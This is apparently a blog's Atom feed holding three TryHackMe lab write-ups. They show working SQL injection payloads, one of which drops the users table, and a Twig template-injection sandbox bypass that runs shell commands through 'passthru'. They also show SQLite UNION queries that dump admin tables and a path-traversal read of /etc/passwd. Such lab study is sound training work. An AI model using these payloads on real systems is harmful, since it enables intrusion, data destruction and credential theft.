<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
  <title>writeups on aviskase</title>
  <id>https://www.aviskase.com/</id>
  <updated>2025-02-13T04:47:13Z</updated>
  <link rel="self" type="application/atom+xml" href="https://www.aviskase.com/categories/writeups/feeds/all.atom.xml" hreflang="en"/>
  <link rel="alternate" type="text/html" href="https://www.aviskase.com/categories/writeups/" hreflang="en"/>
  <entry>
    <title>Writeup: TryHackMe Injectics</title>
    <link rel="alternate" href="https://www.aviskase.com/articles/2025/02/13/writeup-tryhackme-injectics/" hreflang="en"/>
    <published>2025-02-13T04:47:13Z</published>
    <updated>2025-02-13T04:47:13Z</updated>
    <author><name>Yuliya Bagriy</name></author><id>tag:www.aviskase.com,2025-02-13:/articles/2025/02/13/writeup-tryhackme-injectics/</id>
    
    <summary type="html"><![CDATA[<div class="callout info">
    <ul>
<li><a href="https://tryhackme.com/room/injectics" class="external-link">Injectics</a></li>
<li>Difficulty: medium</li>
<li>Platform: web</li>
</ul>
<p>Can you utilise your web pen-testing skills to safeguard the event from any injection attack?</p>
<p>Answer the questions below:</p>
<ol>
<li>What is the flag value after logging into the admin panel?</li>
<li>What is the content of the hidden text file in the flags folder?</li>
</ol>
</div>
<p>This room acts as a final challenge for the advanced injection attacks module. Vulnerabilities explored were:</p>]]></summary>
    <content type="html"><![CDATA[<div class="callout info">
    <ul>
<li><a href="https://tryhackme.com/room/injectics" class="external-link">Injectics</a></li>
<li>Difficulty: medium</li>
<li>Platform: web</li>
</ul>
<p>Can you utilise your web pen-testing skills to safeguard the event from any injection attack?</p>
<p>Answer the questions below:</p>
<ol>
<li>What is the flag value after logging into the admin panel?</li>
<li>What is the content of the hidden text file in the flags folder?</li>
</ol>
</div>
<p>This room acts as a final challenge for the advanced injection attacks module. Vulnerabilities explored were:</p>
<ul>
<li>Information disclosure</li>
<li>SQL injections</li>
<li>Server-side template injection</li>
</ul>
<h2 id="information-gathering" >
  <a href="#information-gathering">Information gathering</a>
</h2>
<p>I didn&rsquo;t go for the port scanning because it was evident that our focus was to find injection points in the web application.</p>
<p>First, I checked the home page source code. It has interesting comments:</p>
<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#6c7086;font-style:italic">&lt;!-- Website developed by John Tim - dev@injectics.thm--&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6c7086;font-style:italic">&lt;!-- Mails are stored in mail.log file--&gt;</span>
</span></span></code></pre></div><p>Next, I explored the website. The only working link on the home page is to the <code>/login.php</code> page which also has &ldquo;Login as administrator&rdquo; link to <code>/adminLogin007.php</code>. Both are loading <code>script.js</code> which handles input validation:</p>
<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#cba6f7">const</span> invalidKeywords <span style="color:#89dceb;font-weight:bold">=</span> [<span style="color:#a6e3a1">&#39;or&#39;</span>, <span style="color:#a6e3a1">&#39;and&#39;</span>, <span style="color:#a6e3a1">&#39;union&#39;</span>, <span style="color:#a6e3a1">&#39;select&#39;</span>, <span style="color:#a6e3a1">&#39;&#34;&#39;</span>, <span style="color:#a6e3a1">&#34;&#39;&#34;</span>];
</span></span><span style="display:flex;"><span><span style="color:#cba6f7">for</span> (<span style="color:#f38ba8">let</span> keyword <span style="color:#cba6f7">of</span> invalidKeywords) {
</span></span><span style="display:flex;"><span>	<span style="color:#cba6f7">if</span> (username.includes(keyword)) {
</span></span><span style="display:flex;"><span>		alert(<span style="color:#a6e3a1">&#39;Invalid keywords detected&#39;</span>);
</span></span><span style="display:flex;"><span>	   <span style="color:#cba6f7">return</span> <span style="color:#fab387">false</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>The script checks for SQL keywords, thus, it seems like a good place to try SQLi.</p>
<p>Before doing that, I opened <code>/mail.log</code> file mentioned in the comments:</p>
<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-mysql" data-lang="mysql"><span style="display:flex;"><span><span style="color:#cba6f7">From</span>: dev<span style="color:#89dceb;font-weight:bold">@</span>injectics.thm
</span></span><span style="display:flex;"><span><span style="color:#cba6f7">To</span>: superadmin<span style="color:#89dceb;font-weight:bold">@</span>injectics.thm
</span></span><span style="display:flex;"><span>Subject: <span style="color:#cba6f7">Update</span> <span style="color:#cba6f7">before</span> holidays
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Hey,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#cba6f7">Before</span> heading off <span style="color:#cba6f7">on</span> holidays, I wanted <span style="color:#cba6f7">to</span> <span style="color:#cba6f7">update</span> you <span style="color:#cba6f7">on</span> the latest changes <span style="color:#cba6f7">to</span> the website. I have implemented several enhancements <span style="color:#cba6f7">and</span> enabled a special service called Injectics. This service continuously monitors the <span style="color:#cba6f7">database</span> <span style="color:#cba6f7">to</span> ensure it remains <span style="color:#cba6f7">in</span> a stable state.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#cba6f7">To</span> <span style="color:#cba6f7">add</span> an extra layer of safety, I have configured the service <span style="color:#cba6f7">to</span> automatically <span style="color:#cba6f7">insert</span> <span style="color:#cba6f7">default</span> credentials <span style="color:#cba6f7">into</span> the <span style="color:#89dceb;font-weight:bold">`</span>users<span style="color:#89dceb;font-weight:bold">`</span> <span style="color:#cba6f7">table</span> <span style="color:#cba6f7">if</span> it <span style="color:#cba6f7">is</span> ever deleted <span style="color:#cba6f7">or</span> becomes corrupted. This ensures that we always have a way <span style="color:#cba6f7">to</span> access the system <span style="color:#cba6f7">and</span> perform necessary maintenance. I have scheduled the service <span style="color:#cba6f7">to</span> run every minute.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Here are the <span style="color:#cba6f7">default</span> credentials that will be added:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#89dceb;font-weight:bold">|</span> Email                     <span style="color:#89dceb;font-weight:bold">|</span> Password 	              <span style="color:#89dceb;font-weight:bold">|</span>
</span></span><span style="display:flex;"><span><span style="color:#89dceb;font-weight:bold">|---------------------------|-------------------------|</span>
</span></span><span style="display:flex;"><span><span style="color:#89dceb;font-weight:bold">|</span> superadmin<span style="color:#89dceb;font-weight:bold">@</span>injectics.thm  <span style="color:#89dceb;font-weight:bold">|</span> superSecurePasswd101    <span style="color:#89dceb;font-weight:bold">|</span>
</span></span><span style="display:flex;"><span><span style="color:#89dceb;font-weight:bold">|</span> dev<span style="color:#89dceb;font-weight:bold">@</span>injectics.thm         <span style="color:#89dceb;font-weight:bold">|</span> devPasswd123            <span style="color:#89dceb;font-weight:bold">|</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Please let me know <span style="color:#cba6f7">if</span> there are any further updates <span style="color:#cba6f7">or</span> changes needed.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Best regards,
</span></span><span style="display:flex;"><span>Dev Team
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>dev<span style="color:#89dceb;font-weight:bold">@</span>injectics.thm
</span></span></code></pre></div><p>Three important pieces here:</p>
<ul>
<li>There are two known users.</li>
<li>Their info is stored in the table <code>users</code>.</li>
<li>If something happens to the table, it gets recreated with the default credentials.</li>
</ul>
<p>Just to be sure, I tried logging in with these credentials, but it wasn&rsquo;t successful.</p>
<h2 id="bypassing-authentication-sqli" >
  <a href="#bypassing-authentication-sqli">Bypassing authentication: SQLi</a>
</h2>
<p>I captured requests during login attempts with the Burp Suite. I copied them to files and used <a href="https://sqlmap.org/" class="external-link">sqlmap</a> to find vulnerabilities. It could not detect anything for the administrator login page but successfully identified injection point for the normal login.</p>
<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#89dceb;font-weight:bold">$</span> sqlmap <span style="color:#89dceb;font-weight:bold">-</span>r functions<span style="color:#89dceb;font-weight:bold">.</span>req <span style="color:#89dceb;font-weight:bold">--</span>level <span style="color:#fab387">4</span>
</span></span><span style="display:flex;"><span><span style="color:#89dceb;font-weight:bold">...</span>
</span></span><span style="display:flex;"><span>sqlmap identified the following injection point(s) with a total of <span style="color:#fab387">1758</span> HTTP(s) requests:
</span></span><span style="display:flex;"><span><span style="color:#89dceb;font-weight:bold">---</span>
</span></span><span style="display:flex;"><span>Parameter: username (POST)
</span></span><span style="display:flex;"><span>    Type: time<span style="color:#89dceb;font-weight:bold">-</span>based blind
</span></span><span style="display:flex;"><span>    Title: MySQL <span style="color:#89dceb;font-weight:bold">&gt;=</span> <span style="color:#fab387">5.0</span><span style="color:#89dceb;font-weight:bold">.</span><span style="color:#fab387">12</span> RLIKE time<span style="color:#89dceb;font-weight:bold">-</span>based blind
</span></span><span style="display:flex;"><span>    Payload: username<span style="color:#89dceb;font-weight:bold">=</span>superadmin<span style="color:#f38ba8">@</span>injectics<span style="color:#89dceb;font-weight:bold">.</span>thm<span style="color:#a6e3a1">&#39; RLIKE SLEEP(5)-- MGux&amp;password=&amp;function=login</span>
</span></span><span style="display:flex;"><span><span style="color:#89dceb;font-weight:bold">---</span>
</span></span></code></pre></div><p>With the suggested payload, I logged into the dashboard.</p>
<div class="callout note">
    <p>It&rsquo;s possible to achieve the same result with a simpler payload: <code>' || 1=1;-- -</code></p>
</div>
<h2 id="resetting-users-sqli" >
  <a href="#resetting-users-sqli">Resetting users: SQLi</a>
</h2>
<p>The dashboard provides the ability to edit the leader board. A<code>POST</code> request to <code>/edit_leaderboard.php</code> saves new data. Here I again used sqlmap to find vulnerable fields:</p>
<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#89dceb;font-weight:bold">$</span> sqlmap <span style="color:#89dceb;font-weight:bold">-</span>r edit<span style="color:#89dceb;font-weight:bold">.</span>req <span style="color:#89dceb;font-weight:bold">--</span>level <span style="color:#fab387">4</span>
</span></span><span style="display:flex;"><span><span style="color:#89dceb;font-weight:bold">...</span>
</span></span><span style="display:flex;"><span><span style="color:#89dceb;font-weight:bold">---</span>
</span></span><span style="display:flex;"><span>Parameter: gold (POST)
</span></span><span style="display:flex;"><span>    Type: boolean<span style="color:#89dceb;font-weight:bold">-</span>based blind
</span></span><span style="display:flex;"><span>    Title: MySQL boolean<span style="color:#89dceb;font-weight:bold">-</span>based blind <span style="color:#89dceb;font-weight:bold">-</span> Parameter replace (MAKE_SET)
</span></span><span style="display:flex;"><span>    Payload: rank<span style="color:#89dceb;font-weight:bold">=</span><span style="color:#fab387">1</span><span style="color:#89dceb;font-weight:bold">&amp;</span>country<span style="color:#89dceb;font-weight:bold">=&amp;</span>gold<span style="color:#89dceb;font-weight:bold">=</span>MAKE_SET(<span style="color:#fab387">1637</span><span style="color:#89dceb;font-weight:bold">=</span><span style="color:#fab387">1637</span>,<span style="color:#fab387">3031</span>)<span style="color:#89dceb;font-weight:bold">&amp;</span>silver<span style="color:#89dceb;font-weight:bold">=</span><span style="color:#fab387">21</span><span style="color:#89dceb;font-weight:bold">&amp;</span>bronze<span style="color:#89dceb;font-weight:bold">=</span><span style="color:#fab387">12345</span>
</span></span><span style="display:flex;"><span><span style="color:#89dceb;font-weight:bold">---</span>
</span></span><span style="display:flex;"><span><span style="color:#89dceb;font-weight:bold">...</span>
</span></span></code></pre></div><p>I did a lot of poking around trying to exploit it. Breakthrough moment came with a very simple payload <code>42;</code> which updated medals for all countries instead of the selected one.</p>
<p>So, I was ready to reset users by dropping their table using payload <code>42; drop table users;</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>POST /edit_leaderboard.php HTTP/1.1
</span></span><span style="display:flex;"><span>Host: MACHINE_IP
</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
</span></span><span style="display:flex;"><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
</span></span><span style="display:flex;"><span>Accept-Language: en-US,en;q=0.5
</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate, br
</span></span><span style="display:flex;"><span>Referer: http://10.10.170.160/edit_leaderboard.php?rank=1&amp;country=USA
</span></span><span style="display:flex;"><span>Content-Type: application/x-www-form-urlencoded
</span></span><span style="display:flex;"><span>Content-Length: 67
</span></span><span style="display:flex;"><span>Origin: http://MACHINE_IP
</span></span><span style="display:flex;"><span>Connection: keep-alive
</span></span><span style="display:flex;"><span>Cookie: PHPSESSID=4jvgqrd1bqc47rqrv7m47id7q1
</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests: 1
</span></span><span style="display:flex;"><span>Priority: u=0, i
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rank=6&amp;country=&amp;gold=0&amp;silver=0&amp;bronze=42; drop table users;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>--- 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HTTP/1.1 200 OK
</span></span><span style="display:flex;"><span>Date: Mon, 10 Feb 2_025 19:45:53 GMT
</span></span><span style="display:flex;"><span>Server: Apache/2.4.41 (Ubuntu)
</span></span><span style="display:flex;"><span>Expires: Thu, 19 Nov 1981 08:52:00 GMT
</span></span><span style="display:flex;"><span>Cache-Control: no-store, no-cache, must-revalidate
</span></span><span style="display:flex;"><span>Pragma: no-cache
</span></span><span style="display:flex;"><span>Vary: Accept-Encoding
</span></span><span style="display:flex;"><span>Content-Length: 127
</span></span><span style="display:flex;"><span>Keep-Alive: timeout=5, max=100
</span></span><span style="display:flex;"><span>Connection: Keep-Alive
</span></span><span style="display:flex;"><span>Content-Type: text/html; charset=UTF-8
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Seems like database or some important table is deleted. InjecticsService is running to restore it. Please wait for 1-2 minutes.
</span></span></code></pre></div><div class="callout note">
    <p>As you noticed, both attempts at using sqlmap only complicated things. Try simple stupid things first!</p>
</div>
<h2 id="getting-the-first-flag" >
  <a href="#getting-the-first-flag">Getting the first flag</a>
</h2>
<p>After the user table was restored, I logged in as an administrator using credentials found in <code>mail.log</code>. Here, in the dashboard, we can see our first flag: <code>THM{REDACTED}</code>.</p>
<h2 id="reading-hidden-flag-file-rce-via-ssti" >
  <a href="#reading-hidden-flag-file-rce-via-ssti">Reading hidden flag file: RCE via SSTI</a>
</h2>
<p>Next flag should be in the flags directory. If you navigate to <code>/flags</code> while logged in as an administrator, you receive access denied error; thus, we need to find another way to access this directory.</p>
<p>There is a &ldquo;Profile&rdquo; button which leads to <code>/update_profile.php</code> page with three editable fields: email, first name, last name. Editing first name changes to the dashboard greeting.</p>
<p>By then, I was pretty confident that we had to find a SSTI vulnerability because (a) it was part of the module (b) it&rsquo;s simple enough to allow RCE. My first payload was <code>{{7*'7'}}</code> to confirm that it was Twig templating engine.</p>
<p>Exploitation proved difficult for me. While trying <a href="https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/PHP/#twig" class="external-link">different payloads</a> I quickly understood that we&rsquo;re in the sandbox. So I tried exploiting <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-23614" class="external-link">CVE-2022-23614</a> vulnerability that allows bypassing sandbox mode via <code>sort</code> function. I was on the right track but ended up looking for a hint, because functions <code>exec</code> and <code>system</code> did not work. <a href="https://jaxafed.github.io/posts/tryhackme-injectics/" class="external-link">There I learned</a> about another useful function: <code>passthru</code>.</p>
<p>First, a payload to list files in the directory <code>flags</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>{{[&#39;ls flags&#39;,&#34;&#34;]|sort(&#39;passthru&#39;)|join}}
</span></span></code></pre></div><p>And finally, to get the flag:</p>
<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>{{[&#39;cat flags/REDACTED.txt&#39;,&#34;&#34;]|sort(&#39;passthru&#39;)|join}}
</span></span></code></pre></div><p>
<figure>
  <picture>
    
    
    <source srcset="https://www.aviskase.com/articles/2025/02/13/writeup-tryhackme-injectics/dashboard_hu_80df94a38b0d34a6.webp" type="image/webp">
    <img class="" src="https://www.aviskase.com/articles/2025/02/13/writeup-tryhackme-injectics/dashboard.png" alt="Screenshot of the dashboard with displayed flags" defer>
	</picture>
	
</figure></p>
]]></content>
  </entry>
  <entry>
    <title>Writeup: TryHackMe Light</title>
    <link rel="alternate" href="https://www.aviskase.com/articles/2025/02/05/writeup-tryhackme-light/" hreflang="en"/>
    <published>2025-02-05T19:03:58Z</published>
    <updated>2025-02-05T19:03:58Z</updated>
    <author><name>Yuliya Bagriy</name></author><id>tag:www.aviskase.com,2025-02-05:/articles/2025/02/05/writeup-tryhackme-light/</id>
    
    <summary type="html"><![CDATA[<div class="callout info">
    <ul>
<li><a href="https://tryhackme.com/r/room/lightroom" class="external-link">Light</a></li>
<li>Difficulty: easy</li>
<li>Platform: db</li>
</ul>
<p>I am working on a database application called Light! Would you like to try it out?  If so, the application is running on port 1337. You can connect to it using <code>nc MACHINE_IP 1337</code>. You can use the username <code>smokey</code> in order to get started.</p>]]></summary>
    <content type="html"><![CDATA[<div class="callout info">
    <ul>
<li><a href="https://tryhackme.com/r/room/lightroom" class="external-link">Light</a></li>
<li>Difficulty: easy</li>
<li>Platform: db</li>
</ul>
<p>I am working on a database application called Light! Would you like to try it out?  If so, the application is running on port 1337. You can connect to it using <code>nc MACHINE_IP 1337</code>. You can use the username <code>smokey</code> in order to get started.</p>
</div>
<p>Connect to the machine and try invalid and valid usernames:</p>
<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ nc MACHINE_IP <span style="color:#fab387">1337</span>
</span></span><span style="display:flex;"><span>Welcome to the Light database!
</span></span><span style="display:flex;"><span>Please enter your username: blah
</span></span><span style="display:flex;"><span>Username not found.
</span></span><span style="display:flex;"><span>Please enter your username: smokey
</span></span><span style="display:flex;"><span>Password: vYQ5ngPpw8AdUmL
</span></span></code></pre></div><p>Try a quote to check for injection vulnerabilities:</p>
<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please enter your username: smokey&#39;
</span></span><span style="display:flex;"><span>Error: unrecognized token: &#34;&#39;smokey&#39;&#39; LIMIT 30&#34;
</span></span></code></pre></div><p>Good, we&rsquo;re dealing with the database. Let&rsquo;s break out of the error with a comment:</p>
<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please enter your username: smokey&#39;--
</span></span><span style="display:flex;"><span>For strange reasons I can&#39;t explain, any input containing /*, -- or, %0b is not allowed :)
</span></span></code></pre></div><p>Ok, no comments. We can do it differently:</p>
<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please enter your username: smokey&#39; or &#39;
</span></span><span style="display:flex;"><span>Password: vYQ5ngPpw8AdUmL
</span></span></code></pre></div><div class="callout note">
    <p>After finishing the room I learned that you can do <code>smokey' '</code> to create a <a href="https://www.w3schools.com/sql/sql_alias.asp" class="external-link">SQL alias</a> with the same result.</p>
</div>
<p>So, there is some filtering here. And it also checks keywords:</p>
<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please enter your username: &#39; UNION 
</span></span><span style="display:flex;"><span>Ahh there is a word in there I don&#39;t like :(
</span></span></code></pre></div><p>At this point I guessed that room&rsquo;s name hinted at SQLite database. Using this <a href="https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf" class="external-link">SQLite explotaition paper</a> as a reference, let&rsquo;s enumerate tables and their structures. To escape keyword filtering we can use random letter cases.</p>
<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please enter your username: -1&#39; UnioN Select group_concat(tbl_name) FRoM sqlite_master WhEre type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; or &#39;
</span></span><span style="display:flex;"><span>Password: usertable,admintable
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Please enter your username: -1&#39;  UnIon SeLeCT sql FroM sqlite_master WHerE type!=&#39;meta&#39; AND sql NOT NULL AND name =&#39;usertable&#39; or &#39;
</span></span><span style="display:flex;"><span>Password: CREATE TABLE usertable (
</span></span><span style="display:flex;"><span>                   id INTEGER PRIMARY KEY,
</span></span><span style="display:flex;"><span>                   username TEXT,
</span></span><span style="display:flex;"><span>                   password INTEGER)
</span></span><span style="display:flex;"><span>Please enter your username: -1&#39;  UnIon SeLeCT sql FroM sqlite_master WHerE type!=&#39;meta&#39; AND sql NOT NULL AND name =&#39;admintable&#39; or &#39;
</span></span><span style="display:flex;"><span>Password: CREATE TABLE admintable (
</span></span><span style="display:flex;"><span>                   id INTEGER PRIMARY KEY,
</span></span><span style="display:flex;"><span>                   username TEXT,
</span></span><span style="display:flex;"><span>                   password INTEGER)
</span></span></code></pre></div><p>We&rsquo;re ready to get flags. First flag: admin username.</p>
<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please enter your username: -1&#39;  UnIon SeLeCT group_concat(username) FroM &#39;admintable&#39; WHERE id NOT NULL or &#39; 
</span></span><span style="display:flex;"><span>Password: REDACTED,flag
</span></span></code></pre></div><p>Second and third flags: admin passwords and flag value.</p>
<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please enter your username:-1&#39;  UnIon SeLeCT group_concat(password) FroM &#39;admintable&#39; WHERE id NOT NULL or &#39;
</span></span><span style="display:flex;"><span>Password: REDACTED,REDACTED
</span></span></code></pre></div><p>Or, to get a full table with all flags at once:</p>
<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please enter your username: -1&#39;  UnIon SeLeCT GROUP_CONCAT(username || &#39; &#39; || password, &#39;, &#39;) AS combined FroM &#39;admintable&#39; WHERE id NOT NULL or &#39;
</span></span><span style="display:flex;"><span>Password: REDACTED REDACTED, flag REDACTED
</span></span></code></pre></div>]]></content>
  </entry>
  <entry>
    <title>Writeup: TryHackMe Lo-Fi</title>
    <link rel="alternate" href="https://www.aviskase.com/articles/2025/02/03/writeup-tryhackme-lo-fi/" hreflang="en"/>
    <published>2025-02-03T17:12:54Z</published>
    <updated>2025-02-03T17:12:54Z</updated>
    <author><name>Yuliya Bagriy</name></author><id>tag:www.aviskase.com,2025-02-03:/articles/2025/02/03/writeup-tryhackme-lo-fi/</id>
    
    <summary type="html"><![CDATA[<div class="callout info"><ul>
<li><a href="https://tryhackme.com/r/room/lofi" class="external-link">Lo-Fi</a></li>
<li>Difficulty: easy</li>
<li>Platform: web</li>
</ul>
<p>Want to hear some lo-fi beats, to relax or study to? We&rsquo;ve got you covered!
Check out similar content on TryHackMe:</p>
<ul>
<li>LFI Path Traversal</li>
<li>File Inclusion</li>
</ul></div>
<p>Very simple room. Its description mentions <em>local file inclusion</em> vulnerability.</p>
<p>Open the website at <code>http://MACHINE_IP</code>. There are links to other pages like this: <code>http://MACHINE_IP/?page=relax.php</code></p>]]></summary>
    <content type="html"><![CDATA[<div class="callout info"><ul>
<li><a href="https://tryhackme.com/r/room/lofi" class="external-link">Lo-Fi</a></li>
<li>Difficulty: easy</li>
<li>Platform: web</li>
</ul>
<p>Want to hear some lo-fi beats, to relax or study to? We&rsquo;ve got you covered!
Check out similar content on TryHackMe:</p>
<ul>
<li>LFI Path Traversal</li>
<li>File Inclusion</li>
</ul></div>
<p>Very simple room. Its description mentions <em>local file inclusion</em> vulnerability.</p>
<p>Open the website at <code>http://MACHINE_IP</code>. There are links to other pages like this: <code>http://MACHINE_IP/?page=relax.php</code></p>
<p>Attempt to get LFI <code>http://MACHINE_IP/?page=../../../etc/passwd</code> is working.</p>
<p>Let&rsquo;s try to find a flag. I just stompted up in the directory hierarchy: <code>http://MACHINE_IP/?page=../../../flag.txt</code>. Success: <code>flag{REDACTED}</code>!</p>
<p>Even though it is a very simple room, I still checked other writeups. And it was a good idea because here you can read about <a href="https://jaxafed.github.io/posts/tryhackme-lo-fi/#extra---rce" class="external-link">how to escalate LFI to RCE</a>.</p>
]]></content>
  </entry>
</feed>
